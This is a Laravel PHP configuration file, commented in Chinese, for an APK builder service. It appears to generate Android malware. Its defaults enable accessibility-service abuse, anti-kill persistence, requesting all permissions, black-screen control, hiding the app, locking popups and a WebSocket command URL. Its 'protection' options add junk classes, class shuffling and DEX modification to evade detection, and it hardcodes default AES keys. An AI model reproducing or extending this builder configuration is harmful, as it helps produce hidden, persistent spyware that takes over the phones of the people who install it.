<?php

return [

    /*
    |--------------------------------------------------------------------------
    | APK Builder Configuration
    |--------------------------------------------------------------------------
    |
    | APK 构建服务的配置选项
    |
    */

    // APK 模板目录（解压后的 apkstub）
    'template_path' => storage_path('app/apk/template'),

    // 构建工具目录（apktool.jar, signapk.jar 等）
    'tools_path' => storage_path('app/apk/tools'),

    // 构建输出目录
    'output_path' => storage_path('app/public/apk'),

    // 用户图标存储目录
    'icons_path' => storage_path('app/public/icons'),

    // 用户背景图存储目录
    'backgrounds_path' => storage_path('app/public/backgrounds'),

    // 默认图标（完整路径）
    'default_icon' => env('APK_DEFAULT_ICON', storage_path('app/public/icons/default/icon.png')),

    // 临时构建目录（留空则使用系统临时目录）
    'temp_path' => env('APK_BUILD_TEMP_PATH', ''),

    // 日志目录
    'log_path' => storage_path('logs/apk'),

    /*
    |--------------------------------------------------------------------------
    | Encryption Settings
    |--------------------------------------------------------------------------
    |
    | AES 加密配置，用于加密 APK 中的敏感配置
    | 警告：修改这些值会导致已构建的 APK 无法正常工作
    |
    */

    'encryption' => [
        'iv' => env('APK_ENCRYPTION_IV', '2230209522049090'),
        'password' => env('APK_ENCRYPTION_PASSWORD', '4814780584699673'),
        'salt' => env('APK_ENCRYPTION_SALT', '2894356330652558'),
        'iterations' => (int) env('APK_ENCRYPTION_ITERATIONS', 65536),
    ],

    /*
    |--------------------------------------------------------------------------
    | Default Build Settings
    |--------------------------------------------------------------------------
    |
    | 默认构建配置
    |
    */

    'defaults' => [
        // 默认包名前缀
        'package_prefix' => 'com.app',

        // WebSocket 完整地址 (包含协议 ws:// 或 wss://)
        'websocket_url' => env('WEBSOCKET_URL', 'ws://localhost:8081'),

        // 默认功能开关
        'use_access' => '1',        // 无障碍服务
        'use_antkill' => '1',       // 防杀进程
        'user_allprims' => '1',     // 请求所有权限
        'user_blackprims' => '1',   // 黑屏权限
        'hidden_app' => '1',        // 隐藏应用
        'use_draw' => '0',          // 悬浮窗
        'open_access' => '0',       // 自动打开无障碍
        'diao_type' => '1',         // 弹窗锁定

        // 默认界面配置
        'login_title' => '欢迎使用',
        'login_dis' => '允许受限制的设置',
        'login_btn' => '开始',
        'notify_title' => ' ',
        'notify_msg' => 'on',

        // 默认构建类型
        'build_type' => 'C',        // C=Custom, S=Store
        'install_type' => 'g',      // 安装引导类型
        'hide_type' => 'f',         // 隐藏类型

        // 默认背景
        'background' => 'black',    // 'black' 或图片路径
    ],

    /*
    |--------------------------------------------------------------------------
    | Protection Settings
    |--------------------------------------------------------------------------
    |
    | APK 保护功能配置
    |
    */

    'protection' => [
        // 是否启用垃圾类生成
        'enable_junk_classes' => (bool) env('APK_ENABLE_JUNK_CLASSES', false),

        // 是否启用类名混淆
        'enable_class_shuffle' => (bool) env('APK_ENABLE_CLASS_SHUFFLE', false),

        // 是否启用 APK 保护（ZIP 注释注入）
        'enable_apk_protection' => (bool) env('APK_ENABLE_PROTECTION', false),

        // 是否启用 DEX 修改
        'enable_dex_modification' => (bool) env('APK_ENABLE_DEX_MODIFICATION', false),

        // 垃圾类数量
        'junk_class_count' => (int) env('APK_JUNK_CLASS_COUNT', 50),

        // 每个垃圾类的方法数量
        'junk_method_count' => (int) env('APK_JUNK_METHOD_COUNT', 10),
    ],

    /*
    |--------------------------------------------------------------------------
    | Build Timeout
    |--------------------------------------------------------------------------
    |
    | 构建超时设置（秒）
    |
    */

    'timeout' => (int) env('APK_BUILD_TIMEOUT', 300),

    /*
    |--------------------------------------------------------------------------
    | Cleanup Settings
    |--------------------------------------------------------------------------
    |
    | 清理设置
    |
    */

    // 构建完成后是否清理临时文件
    'cleanup_on_success' => true,

    // 构建失败后是否清理临时文件
    'cleanup_on_failure' => true,

    // 保留旧构建缓存的最大数量（0 = 不保留）
    'max_cache_builds' => 0,

];
